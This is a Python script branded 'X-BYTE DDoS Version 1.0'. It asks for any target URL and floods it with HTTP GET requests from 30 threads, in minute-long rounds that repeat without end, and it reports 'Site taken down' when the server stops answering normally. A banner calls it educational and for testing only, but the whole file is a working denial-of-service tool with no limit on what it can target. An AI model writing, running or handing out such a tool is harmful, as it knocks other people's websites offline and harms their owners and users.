import requests
import socket
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

def print_banner():
    """Print the banner in red and version in yellow."""
    banner_text = pyfiglet.figlet_format("X-BYTE", font="slant")
    version_text = "DDoS Version 1.0"
    note_text = "This is only for educational and testing purposes. Made by X-BYTE."

    print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{version_text}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{note_text}{Style.RESET_ALL}")

def resolve_ip_and_port(url):
    """Resolve IP address and select a port for the given URL."""
    # Remove schema from URL if present
    if url.startswith("http://"):
        url = url[len("http://"):]
    elif url.startswith("https://"):
        url = url[len("https://"):]

    # Split URL into hostname and port if specified
    parts = url.split(':')
    hostname = parts[0]
    port = 80  # Default HTTP port

    if len(parts) > 1:
        try:
            port = int(parts[1])
        except ValueError:
            print(f"{Fore.RED}Invalid port specified. Using default port 80.{Style.RESET_ALL}")

    # Resolve the IP address
    try:
        ip_address = socket.gethostbyname(hostname)
        return ip_address, port
    except socket.gaierror:
        print(f"{Fore.RED}Unable to resolve IP address for {hostname}.{Style.RESET_ALL}")
        sys.exit()

def send_requests(url, num_requests):
    """Send a specified number of requests to a URL."""
    success_count = 0
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                success_count += 1
            elif response.status_code != 200:
                print(f"{Fore.RED}Site taken down with status code {response.status_code}{Style.RESET_ALL}")
                sys.exit()
        except requests.exceptions.RequestException:
            pass
    return success_count

def bot_task(ip_address, port, num_requests, duration):
    """Task for each bot to send requests and measure time."""
    url = f"http://{ip_address}:{port}"
    start_time = time.time()
    end_time = start_time + duration
    total_successes = 0
    while time.time() < end_time:
        successes = send_requests(url, num_requests)
        total_successes += successes
    return total_successes

def load_test(url, num_bots, requests_per_bot, duration):
    """Perform the load test with the specified number of bots."""
    ip_address, port = resolve_ip_and_port(url)

    while True:
        print(f"Starting load test with {num_bots} bots on {ip_address}:{port}.")

        total_requests_sent = 0

        with ThreadPoolExecutor(max_workers=num_bots) as executor:
            futures = [executor.submit(bot_task, ip_address, port, requests_per_bot, duration) for _ in range(num_bots)]
            for future in as_completed(futures):
                total_requests_sent += future.result()

        print(f"Requests sent: [{total_requests_sent}]")
        
        # Wait before next round
        time.sleep(duration)

if __name__ == "__main__":
    print_banner()
    url = input("Enter the URL to target (e.g., http://example.com): ")
    num_bots = 30
    requests_per_bot = 1000
    duration = 60  # Duration in seconds (1 minute)
    
    load_test(url, num_bots, requests_per_bot, duration)
